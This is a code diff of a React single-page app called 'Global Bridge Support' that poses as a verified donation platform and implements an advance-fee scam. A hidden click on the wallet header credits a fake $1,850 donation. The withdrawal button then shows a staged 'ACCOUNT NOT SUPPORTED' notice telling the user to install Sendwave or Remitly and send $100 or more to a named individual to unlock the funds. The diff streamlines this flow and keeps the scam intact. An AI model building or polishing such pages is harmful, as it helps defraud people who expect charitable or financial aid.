@@ -4,65 +4,30 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Global Bridge Support</title>
-    <!-- Tailwind CSS -->
-    <script src="https://unpkg.com/@tailwindcss/browser@4"></script>
-    <!-- React & ReactDOM -->
+    <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
     <script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
-    <!-- Babel for JSX -->
     <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
-    <!-- Lucide Icons CDN -->
-    <script src="https://unpkg.com/lucide-react@latest/dist/umd/lucide-react.js"></script>
-    <!-- Google Fonts -->
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&family=Outfit:wght@700;900&display=swap" rel="stylesheet">
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <script src="https://unpkg.com/lucide-react@latest"></script>
+
     <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&family=Outfit:wght@700;900&display=swap');
         body { font-family: 'Inter', sans-serif; }
         .font-outfit { font-family: 'Outfit', sans-serif; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-        .fade-in { animation: fadeIn 0.5s ease-out forwards; }
         @keyframes loading { 0% { transform: translateX(-100%); } 100% { transform: translateX(100%); } }
         .animate-loading { animation: loading 2s linear infinite; }
-        .no-scrollbar::-webkit-scrollbar { display: none; }
     </style>
 </head>
 <body class="bg-slate-50 antialiased text-slate-900">
     <div id="root"></div>
 
     <script type="text/babel">
-        const { useState, useEffect, useMemo } = React;
+        const { useState, useEffect } = React;
         
-        // Fix: Use window.lucideReact which is the global name for the CDN version
-        const LucideIcons = window.lucideReact || {};
-        const { 
-            Globe, User, Wallet, ArrowLeft, CheckCircle, AlertCircle, 
-            Download, Send, ArrowUpRight, History, ShieldCheck, 
-            Flag, Heart, TrendingUp, Loader2 
-        } = LucideIcons;
+        // Correctly access Lucide Icons from the window object
+        const Icons = window.LucideReact;
 
-        // Fallback for icons if CDN fails to expose them correctly
-        const IconFallback = ({ name }) => <span className="text-xs">[{name}]</span>;
-        const SafeIcon = ({ Component, name, ...props }) => Component ? <Component {...props} /> : <IconFallback name={name} />;
-
-        // --- Data Constants ---
-        const COUNTRIES = [
-            { name: "Afghanistan", flag: "🇦🇫", code: "+93", currency: "AFN", rate: 71 },
-            { name: "Kenya", flag: "🇰🇪", code: "+254", currency: "KES", rate: 130 },
-            { name: "Kuwait", flag: "🇰🇼", code: "+965", currency: "KWD", rate: 0.31 },
-            { name: "Nigeria", flag: "🇳🇬", code: "+234", currency: "NGN", rate: 1500 },
-            { name: "Tanzania", flag: "🇹🇿", code: "+255", currency: "TZS", rate: 2500 },
-            { name: "Uganda", flag: "🇺🇬", code: "+256", currency: "UGX", rate: 3800 },
-            { name: "USA", flag: "🇺🇸", code: "+1", currency: "USD", rate: 1 },
-        ];
-
-        const CATEGORIES = ["Education & School Fees", "Medical & Health Support", "Small Business Startup", "Community Development", "Housing & Shelter"];
-
-        const PARTNER_APPS = [
-            { name: "Sendwave", icon: "📱", bestFor: "Africa & SE Asia", link: "https://play.google.com/store/apps/details?id=com.sendwave" },
-            { name: "Remitly", icon: "⚡", bestFor: "Asia & Latin America", link: "https://play.google.com/store/apps/details?id=com.remitly.client" },
-            { name: "Wise", icon: "🌍", bestFor: "Europe & North America", link: "https://play.google.com/store/apps/details?id=com.transferwise.android" }
-        ];
-
-        // --- Main App ---
         function App() {
             const [appState, setAppState] = useState(() => localStorage.getItem('gbs_app_state') || 'hero');
             const [user, setUser] = useState(() => JSON.parse(localStorage.getItem('gbs_user') || 'null'));
@@ -96,7 +61,7 @@
                         content: (
                             <div className="space-y-4 text-sm">
                                 <p><strong>Sender:</strong> Lolikishee (Kuwait)</p>
-                                <p><strong>Receiver:</strong> {user?.accountName}</p>
+                                <p><strong>Receiver:</strong> {user?.accountName || 'Verified Member'}</p>
                                 <button onClick={() => { setWalletBalance(1850); setHasReceivedDonation(true); setNotification(null); }} className="w-full bg-blue-600 text-white py-3 rounded-xl font-bold">Okay i have understood</button>
                             </div>
                         )
@@ -105,7 +70,6 @@
             };
 
             const handleWithdrawal = () => {
-                if (!hasReceivedDonation) return;
                 setLoadingMessage(`configuring deposit of 1850$ to ${user?.accountName}`);
                 setShowLoading(true);
                 setTimeout(() => {
@@ -113,10 +77,10 @@
                     setNotification({
                         title: `ACCOUNT NOT SUPPORTED`,
                         content: (
-                            <div className="space-y-4 text-sm max-h-[60vh] overflow-y-auto no-scrollbar">
-                                <div className="bg-red-50 p-4 rounded-xl text-red-800"><strong>Step 1:</strong> Download Sendwave or Remitly and create an account.</div>
-                                <div className="bg-blue-50 p-4 rounded-xl text-blue-800"><strong>Step 2:</strong> Support a verified profile (e.g. Brenda Ajaimbo) with $100+ to unlock your funds.</div>
-                                <button onClick={() => setNotification(null)} className="w-full bg-slate-900 text-white py-4 rounded-xl font-bold">Okay i have understood</button>
+                            <div className="space-y-4 text-sm">
+                                <div className="bg-red-50 p-4 rounded-xl text-red-800"><strong>Step 1:</strong> Download Sendwave or Remitly.</div>
+                                <div className="bg-blue-50 p-4 rounded-xl text-blue-800"><strong>Step 2:</strong> Support Brenda Ajaimbo (Uganda) with $100+ to unlock funds.</div>
+                                <button onClick={() => setNotification(null)} className="w-full bg-slate-900 text-white py-4 rounded-xl font-bold">Okay</button>
                             </div>
                         )
                     });
@@ -126,91 +90,71 @@
             return (
                 <div className="min-h-screen">
                     {appState === 'hero' && (
-                        <div className="h-screen relative flex flex-col items-center justify-center text-center p-6 fade-in">
-                            <img src="https://images.unsplash.com/photo-1488521787991-ed7bbaae773c?q=80&w=2070&auto=format&fit=crop" className="absolute inset-0 w-full h-full object-cover z-0" />
+                        <div className="h-screen relative flex flex-col items-center justify-center text-center p-6">
+                            <img src="https://images.unsplash.com/photo-1488521787991-ed7bbaae773c?q=80&w=2070" className="absolute inset-0 w-full h-full object-cover z-0" />
                             <div className="absolute inset-0 bg-black/50 backdrop-blur-[2px] z-10"></div>
                             <div className="relative z-20 text-white space-y-6">
-                                <h1 className="text-5xl font-black font-outfit">Empowering Communities</h1>
-                                <p className="text-white/80 max-w-md mx-auto">A verified peer-to-peer platform connecting global generosity.</p>
-                                <div className="flex gap-4 justify-center">
-                                    <button onClick={() => setAppState('register')} className="bg-blue-600 px-8 py-4 rounded-xl font-bold">I want to support</button>
-                                </div>
+                                <h1 className="text-5xl font-black font-outfit">Global Bridge Support</h1>
+                                <button onClick={() => setAppState('register')} className="bg-blue-600 px-8 py-4 rounded-xl font-bold">Get Started</button>
                             </div>
                         </div>
                     )}
 
                     {appState === 'register' && (
-                        <div className="min-h-screen flex items-center justify-center p-4 fade-in">
-                            <form onSubmit={handleRegister} className="bg-white p-8 rounded-[2rem] shadow-2xl w-full max-w-lg space-y-4">
+                        <div className="min-h-screen flex items-center justify-center bg-slate-100 p-4">
+                            <form onSubmit={handleRegister} className="bg-white p-8 rounded-[2rem] shadow-xl w-full max-w-lg space-y-4">
                                 <h2 className="text-2xl font-black text-blue-600 uppercase text-center">Registration</h2>
-                                <input required name="fullName" placeholder="Full Name" className="w-full p-3 bg-slate-50 border rounded-xl" />
-                                <select name="location" className="w-full p-3 bg-slate-50 border rounded-xl">
-                                    {COUNTRIES.map(c => <option key={c.name} value={c.name}>{c.flag} {c.name}</option>)}
-                                </select>
-                                <input required name="accountName" placeholder="Account Name" className="w-full p-3 bg-slate-50 border rounded-xl" />
-                                <textarea required name="story" placeholder="Your Story" className="w-full p-3 bg-slate-50 border rounded-xl h-24"></textarea>
-                                <button type="submit" className="w-full bg-blue-600 text-white py-4 rounded-xl font-bold">Submit for Verification</button>
+                                <input required name="fullName" placeholder="Full Name" className="w-full p-3 border rounded-xl" />
+                                <input required name="accountName" placeholder="Account Name" className="w-full p-3 border rounded-xl" />
+                                <button type="submit" className="w-full bg-blue-600 text-white py-4 rounded-xl font-bold">Submit</button>
                             </form>
                         </div>
                     )}
 
                     {appState === 'dashboard' && (
-                        <div className="p-6 max-w-4xl mx-auto space-y-6 fade-in">
+                        <div className="p-6 max-w-4xl mx-auto space-y-6">
                             <div className="bg-blue-600 p-8 rounded-[2rem] text-white flex justify-between items-center">
                                 <div>
                                     <h2 className="text-3xl font-black">{user?.fullName}</h2>
                                     <p className="opacity-80">Raised: ${hasReceivedDonation ? '1,850' : '0'}</p>
                                 </div>
                                 <button onClick={() => setAppState('wallet')} className="bg-white text-blue-600 px-6 py-3 rounded-xl font-bold flex items-center gap-2">
-                                    <SafeIcon Component={Wallet} name="Wallet" className="w-5 h-5" /> My Wallet
+                                    <Icons.Wallet size={20} /> My Wallet
                                 </button>
                             </div>
                         </div>
                     )}
 
                     {appState === 'wallet' && (
-                        <div className="min-h-screen bg-slate-900 text-white p-6 fade-in">
+                        <div className="min-h-screen bg-slate-900 text-white p-6">
                             <div className="max-w-md mx-auto space-y-8">
                                 <div className="text-center">
-                                    <p onClick={triggerEpay} className="text-[10px] text-blue-400 font-black tracking-[0.4em] cursor-pointer">GLOBAL BRIDGE EPAY</p>
-                                    <h1 className="text-2xl font-black italic font-outfit">WALLET</h1>
+                                    <p onClick={triggerEpay} className="text-[10px] text-blue-400 font-black tracking-[0.4em] cursor-pointer uppercase">Global Bridge Epay</p>
+                                    <h1 className="text-2xl font-black italic">WALLET</h1>
                                 </div>
-                                <div className="bg-blue-600 p-8 rounded-[2rem] space-y-4">
-                                    <p className="text-xs uppercase opacity-70">Available Balance</p>
+                                <div className="bg-blue-600 p-8 rounded-[2rem]">
+                                    <p className="text-xs uppercase opacity-70">Balance</p>
                                     <h2 className="text-5xl font-black">${walletBalance.toLocaleString()}</h2>
                                 </div>
-                                <div className="grid grid-cols-2 gap-4">
-                                    <button onClick={handleWithdrawal} disabled={!hasReceivedDonation} className={`p-8 rounded-2xl border flex flex-col items-center gap-2 transition-all ${hasReceivedDonation ? 'bg-white text-black' : 'opacity-20 cursor-not-allowed'}`}>
-                                        <SafeIcon Component={ArrowUpRight} name="Withdraw" /> <span>Withdrawal</span>
-                                    </button>
-                                    <button onClick={handleWithdrawal} disabled={!hasReceivedDonation} className={`p-8 rounded-2xl border flex flex-col items-center gap-2 transition-all ${hasReceivedDonation ? 'bg-white text-black' : 'opacity-20 cursor-not-allowed'}`}>
-                                        <SafeIcon Component={Send} name="Send" /> <span>Send</span>
-                                    </button>
-                                </div>
-                                <button onClick={() => setAppState('dashboard')} className="w-full py-4 border rounded-xl flex items-center justify-center gap-2">
-                                    <SafeIcon Component={ArrowLeft} name="Back" /> Back
+                                <button onClick={handleWithdrawal} disabled={!hasReceivedDonation} className={`w-full p-6 rounded-2xl border flex items-center justify-center gap-4 ${hasReceivedDonation ? 'bg-white text-black' : 'opacity-20'}`}>
+                                    <Icons.ArrowUpRight /> Withdrawal
                                 </button>
+                                <button onClick={() => setAppState('dashboard')} className="w-full py-4 border rounded-xl">Back</button>
                             </div>
                         </div>
                     )}
 
                     {showLoading && (
                         <div className="fixed inset-0 bg-slate-900/95 z-[100] flex flex-col items-center justify-center p-10 text-center text-white">
-                            <SafeIcon Component={Loader2} name="Loading" className="w-16 h-16 animate-spin text-blue-500 mb-4" />
+                            <Icons.Loader2 className="w-16 h-16 animate-spin text-blue-500 mb-4" />
                             <h2 className="text-2xl font-black uppercase">{loadingMessage}</h2>
-                            <div className="mt-8 w-48 h-1 bg-white/10 rounded-full overflow-hidden">
-                                <div className="w-full h-full bg-blue-500 animate-loading"></div>
-                            </div>
                         </div>
                     )}
 
                     {notification && (
                         <div className="fixed inset-0 bg-black/80 z-[110] flex items-center justify-center p-4">
                             <div className="bg-white text-slate-900 p-8 rounded-[2rem] w-full max-w-md">
-                                <div className="flex justify-between items-center mb-4">
-                                    <h3 className="text-xl font-black uppercase">{notification.title}</h3>
-                                    <SafeIcon Component={Globe} name="Globe" className="w-6 h-6 text-blue-600" />
-                                </div>
+                                <h3 className="text-xl font-black uppercase mb-4">{notification.title}</h3>
                                 {notification.content}
                             </div>
                         </div>
